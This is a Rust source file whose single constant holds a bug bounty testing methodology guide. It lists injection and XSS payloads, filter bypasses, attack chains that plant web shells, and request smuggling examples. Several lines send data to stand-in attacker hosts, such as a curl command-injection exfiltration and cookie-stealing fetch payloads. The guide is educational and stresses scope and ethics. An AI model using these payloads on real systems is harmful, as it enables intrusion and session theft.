// Vulnerability Research & Testing - Bug Bounty Hunting Module
// Systematic testing methodologies for discovering high-impact vulnerabilities


pub const VULNERABILITY_RESEARCH_TESTING_STEPS: &[(&str, &str)] = &[
    (
        "Vulnerability research & testing",
        "OBJECTIVE: Apply systematic testing methodologies to discover high-impact vulnerabilities, focusing on creative attack chains and business logic flaws that automated tools miss.

ACADEMIC BACKGROUND:
OWASP Testing Guide v4.2 provides comprehensive web application testing methodology. PortSwigger Web Security Academy (https://portswigger.net/web-security) offers hands-on vulnerability research training. SANS Penetration Testing describes manual testing approaches. Bug Bounty Playbook by Vickie Li emphasizes creative testing techniques. MITRE ATT&CK Framework T1190 covers exploitation of public-facing applications.

STEP-BY-STEP PROCESS:

1. Manual Vulnerability Testing Methodology:

Authentication Testing:
```bash
# SQL injection in login
username: admin' OR '1'='1' --
password: anything

# NoSQL injection
username[$ne]=admin&password[$ne]=password

# LDAP injection
username: *)(uid=*))(|(uid=*
password: anything

# XML injection in SAML
<saml:NameID>admin</saml:NameID> to <saml:NameID>admin</saml:NameID><saml:Attribute>admin</saml:Attribute>

# JWT token manipulation
# Decode JWT at jwt.io
# Change \"role\": \"user\" to \"role\": \"admin\"
# Try algorithm confusion: change alg to \"none\"
jwt-tool token.jwt -T

# OAuth misconfiguration
# Check redirect_uri manipulation
https://oauth.com/authorize?redirect_uri=https://attacker.com
# Test for token leakage in Referer header
```

Authorization and Access Control:
```bash
# IDOR (Insecure Direct Object Reference)
# Change user IDs in URLs
GET /api/users/123/profile → /api/users/124/profile
GET /api/orders/1000 → /api/orders/1001

# Parameter pollution
GET /api/user?id=123&id=124 (might return user 124)

# HTTP verb tampering
# If POST /api/users/123 is protected, try:
GET /api/users/123
PUT /api/users/123
DELETE /api/users/123
PATCH /api/users/123

# Path traversal for authorization bypass
/api/users/../admin/settings
/api/v1/users/123 → /api/v2/users/123 (different version)

# Forced browsing
/admin (redirect to login)
/admin/settings (might be accessible without /admin check)

# Check for horizontal privilege escalation
# User A accessing User B's resources via parameter manipulation
```

Injection Vulnerabilities:
```bash
# SQL injection testing
# Error-based
' OR 1=1--
\" OR \"\"=\"
') OR ('x'='x

# Union-based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,email FROM users--

# Time-based blind
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

# Second-order SQL injection
# Register username: admin'-- 
# Later query: UPDATE users SET email='new@mail.com' WHERE username='admin'--'

# Command injection
; ls -la
| cat /etc/passwd
`whoami`
$(curl http://attacker.com/$(whoami))

# XML External Entity (XXE)
<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
<root>&xxe;</root>

# Server-Side Template Injection (SSTI)
{{7*7}} (Jinja2/Flask)
${7*7} (Freemarker/Spring)
<%= 7*7 %> (ERB/Ruby)
```

Cross-Site Scripting (XSS):
```bash
# Reflected XSS
?search=<script>alert(document.domain)</script>
?name=<img src=x onerror=alert(1)>

# Stored XSS in profile/comments
<svg/onload=alert(1)>
<body/onload=fetch('http://attacker.com/?c='+document.cookie)>

# DOM-based XSS
# Check JavaScript that uses user input
document.getElementById('output').innerHTML = location.hash.slice(1);
# Payload: #<img src=x onerror=alert(1)>

# XSS in JSON responses
{\"name\":\"<script>alert(1)</script>\"}

# Bypass filters
<ScRiPt>alert(1)</sCrIpT> (case variation)
<img src=x onerror=\"alert(1)\"> (alternative tags)
<svg><animate onbegin=alert(1)> (SVG tags)
```

2. Business Logic Vulnerability Discovery:

E-Commerce Logic Flaws:
```bash
# Race conditions in payment
# Send multiple simultaneous requests to apply discount twice
for i in {1..10}; do
  curl -X POST https://example.com/api/apply-coupon -d \"code=DISCOUNT50\" &
done

# Price manipulation
POST /api/cart/checkout
{\"item_id\": 123, \"quantity\": 1, \"price\": 0.01}

# Negative quantity bypass
{\"item_id\": 123, \"quantity\": -1} (might give refund)

# Currency rounding errors
# Test with: 0.004, 0.005, 0.006 in prices

# Gift card/coupon abuse
# Apply same coupon multiple times
# Use expired coupons by changing client-side date
```

Authentication and Session Logic:
```bash
# Password reset token reuse
# Use same token multiple times
# Token not invalidated after use

# 2FA bypass techniques
# Complete login, intercept 2FA page, directly access /dashboard
# Null or empty 2FA code
2fa_code= (empty)
2fa_code=000000 (default)
2fa_code=null

# Session fixation
# Attacker provides session ID to victim before login
# After victim logs in, attacker uses same session

# Remember me token manipulation
# Decode remember_me cookie
# Change user_id, re-encode, test
```

Rate Limiting and Anti-Automation:
```bash
# Rate limit bypass techniques
# IP rotation via X-Forwarded-For
curl -H \"X-Forwarded-For: 1.2.3.4\" https://example.com/api/endpoint

# User-Agent rotation
while read ua; do
  curl -A \"$ua\" https://example.com/api/endpoint
done < user_agents.txt

# Null byte in parameters
username=admin%00extra

# Case sensitivity bypass
/API/endpoint instead of /api/endpoint

# HTTP verb bypass
If POST is rate-limited, try GET, PUT, PATCH
```

3. Automated Vulnerability Scanning:

Web Application Scanners:
```bash
# Nuclei with templates
nuclei -l targets.txt -t ~/nuclei-templates/ -severity critical,high

# Burp Suite Professional active scan
# 1. Proxy traffic through Burp
# 2. Right-click target → \"Scan\"
# 3. Configure scan: Audit checks, Crawl depth

# OWASP ZAP automated scan
zap-cli quick-scan -s all --spider -r https://example.com

# SQLMap for SQL injection
sqlmap -u \"https://example.com/search?q=test\" --batch --random-agent

# XSStrike for XSS
python3 xsstrike.py -u \"https://example.com/search?q=test\"

# Dalfox for XSS hunting
dalfox url https://example.com/search?keyword=test

# Nikto web server scan
nikto -h https://example.com -Tuning 123456789
```

API-Specific Testing:
```bash
# API fuzzing with ffuf
ffuf -u https://example.com/api/FUZZ -w api-endpoints.txt -mc 200,500

# REST API testing
# Test HTTP methods: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS
curl -X OPTIONS https://example.com/api/users

# GraphQL testing
# Introspection query
curl -X POST https://example.com/graphql \\
  -H \"Content-Type: application/json\" \\
  -d '{\"query\": \"{__schema{types{name}}}\"}'

# GraphQL mutation testing
mutation { deleteUser(id: \"123\") { success } }

# API parameter pollution
/api/users?id=1&id=2
/api/users?id=1&role=admin
```

Content Discovery:
```bash
# Directory bruteforcing
ffuf -u https://example.com/FUZZ -w ~/wordlists/raft-medium-directories.txt

# File discovery
ffuf -u https://example.com/FUZZ -w ~/wordlists/raft-medium-files.txt -e .php,.txt,.bak,.old

# Feroxbuster recursive scan
feroxbuster -u https://example.com -w ~/wordlists/directory-list-2.3-medium.txt -x php,txt,bak

# Gobuster with extensions
gobuster dir -u https://example.com -w ~/wordlists/common.txt -x php,html,txt,bak -t 50

# Dirsearch
dirsearch -u https://example.com -e php,txt,bak -w ~/wordlists/common.txt
```

4. Vulnerability Chaining Techniques:

Common Vulnerability Chains:
```text
CHAIN 1: SSRF → Internal Service Access → RCE
1. Find SSRF in image upload/URL fetch feature
2. Access internal services (http://localhost:6379 Redis)
3. Execute Redis commands for RCE
   url=http://127.0.0.1:6379/
   POST: \"CONFIG SET dir /var/www/html\\r\\nCONFIG SET dbfilename shell.php\"

CHAIN 2: XSS → Session Hijacking → Account Takeover
1. Find stored XSS in user profile
2. Inject cookie stealer: <img src=x onerror='fetch(\"//attacker.com/?c=\"+document.cookie)'>
3. Steal admin session cookie
4. Access admin panel with stolen session

CHAIN 3: IDOR → Information Disclosure → Privilege Escalation
1. Find IDOR in /api/users/{id}
2. Enumerate all user profiles including admins
3. Discover admin password reset tokens in API response
4. Use token to reset admin password

CHAIN 4: File Upload → Path Traversal → RCE
1. Upload file with path traversal: ../../shell.php
2. File saved outside upload directory
3. Access shell at https://example.com/shell.php

CHAIN 5: Open Redirect → OAuth Token Theft
1. Find open redirect: /redirect?url=https://evil.com
2. Craft OAuth authorization URL with redirect
3. Victim clicks, OAuth redirects to evil.com with access token
```

Advanced Attack Techniques:
```bash
# SSRF with DNS rebinding
# Point domain to 127.0.0.1, then change DNS to external IP
# Bypass SSRF filters checking initial DNS

# Polyglot payloads
# XSS + SQLi combined
jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e

# HTTP request smuggling
# CL.TE (Content-Length vs Transfer-Encoding)
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /admin HTTP/1.1
...

# Second-order vulnerabilities
# 1. Store malicious payload (username: <script>alert(1)</script>)
# 2. Trigger in another context (admin views user list)
```

5. Manual Code Review (When Source Available):

Dangerous Functions to Search:
```bash
# PHP dangerous functions
grep -r \"eval(\" .
grep -r \"exec(\" .
grep -r \"system(\" .
grep -r \"passthru(\" .
grep -r \"shell_exec(\" .
grep -r \"unserialize(\" .

# JavaScript dangerous patterns
grep -r \"eval(\" *.js
grep -r \"innerHTML =\" *.js
grep -r \"document.write(\" *.js
grep -r \"dangerouslySetInnerHTML\" *.jsx

# Python dangerous functions
grep -r \"eval(\" *.py
grep -r \"exec(\" *.py
grep -r \"pickle.loads(\" *.py
grep -r \"yaml.load(\" *.py

# SQL injection prone patterns
grep -r \"\\$_GET\" . | grep -E \"(SELECT|INSERT|UPDATE|DELETE)\"
grep -r \"request.GET\" . | grep -E \"(execute|raw)\"
```

6. Target-Specific Research:

CVE Research for Technologies:
```bash
# Search CVEs for identified technologies
# Example: WordPress 5.8.1
searchsploit wordpress 5.8.1
curl \"https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=wordpress+5.8.1\"

# GitHub security advisories
curl \"https://api.github.com/search/repositories?q=wordpress+vulnerability\"

# Exploit-DB search
curl \"https://www.exploit-db.com/search?q=wordpress\"

# NVD search
curl \"https://services.nvd.nist.gov/rest/json/cves/1.0?keyword=wordpress\"
```

Similar Target Research:
```bash
# Find similar targets on bug bounty platforms
# Search disclosed reports for same technology stack
# HackerOne: https://hackerone.com/hacktivity?querystring=wordpress
# Bugcrowd: https://bugcrowd.com/programs → filter by technology

# Learn from writeups
# Search Medium, GitHub, personal blogs
# \"site:medium.com wordpress vulnerability bug bounty\"
# \"site:github.com wordpress bug bounty writeup\"
```

WHAT TO LOOK FOR:
- **High-Severity Findings**: RCE, SQL injection, authentication bypass, SSRF (typically $5K-$20K)
- **Chained Vulnerabilities**: XSS → Session hijacking, IDOR → privilege escalation (increases severity/bounty)
- **Business Logic Flaws**: Payment manipulation, race conditions, broken access control (often missed by scanners)
- **API Vulnerabilities**: Broken object level authorization, mass assignment, GraphQL introspection
- **Authentication Issues**: JWT algorithm confusion, OAuth misconfiguration, 2FA bypass, password reset flaws
- **Unique Findings**: Application-specific vulnerabilities not in common scanner databases

SECURITY IMPLICATIONS:
- **Testing Boundaries**: Never test destructive operations in production (DELETE user, DROP table)
- **Data Protection**: Don't access actual customer data (PII, credentials, payment info)
- **Service Impact**: Rate limit your testing to avoid DoS (use --rate-limit, sleep between requests)
- **Legal Compliance**: Stay within program rules and scope
- **Ethics**: Demonstrate minimum required to prove vulnerability

COMMON PITFALLS:
- **Scanner-Only Testing**: Relying entirely on automated tools missing business logic and chained vulnerabilities
- **Duplicate Submissions**: Not checking disclosed reports before testing common vulnerabilities
- **Low-Quality Findings**: Reporting informational issues (missing headers, descriptive errors) as high severity
- **Poor Impact Demonstration**: Submitting vulnerabilities without clear proof-of-concept or impact explanation
- **Scope Violations**: Testing out-of-scope endpoints because \"they're connected\"
- **Noisy Testing**: Sending thousands of requests per second triggering WAF blocks
- **Giving Up Too Early**: Testing only login page, missing vulnerabilities in complex workflows
- **No Creativity**: Only testing OWASP Top 10, missing application-specific logic flaws

TOOLS REFERENCE:
- **Burp Suite**: https://portswigger.net/burp (web vulnerability scanner)
- **Nuclei**: https://github.com/projectdiscovery/nuclei (template-based scanner)
- **SQLMap**: https://sqlmap.org/ (SQL injection automation)
- **XSStrike**: https://github.com/s0md3v/XSStrike (XSS scanner)
- **ffuf**: https://github.com/ffuf/ffuf (fast web fuzzer)
- **Burp Collaborator**: https://portswigger.net/burp/documentation/collaborator (OOB interaction testing)
- **Dalfox**: https://github.com/hahwul/dalfox (XSS parameter analysis)
- **Jaeles**: https://github.com/jaeles-project/jaeles (automated testing framework)

FURTHER READING:
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- Bug Bounty Playbook by Vickie Li: https://www.amazon.com/Bug-Bounty-Playbook-World-Class-Vulnerability/dp/1718502648
- PentesterLab: https://pentesterlab.com/ (hands-on vulnerability practice)
- HackerOne Disclosed Reports: https://hackerone.com/hacktivity
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings"
    ),
];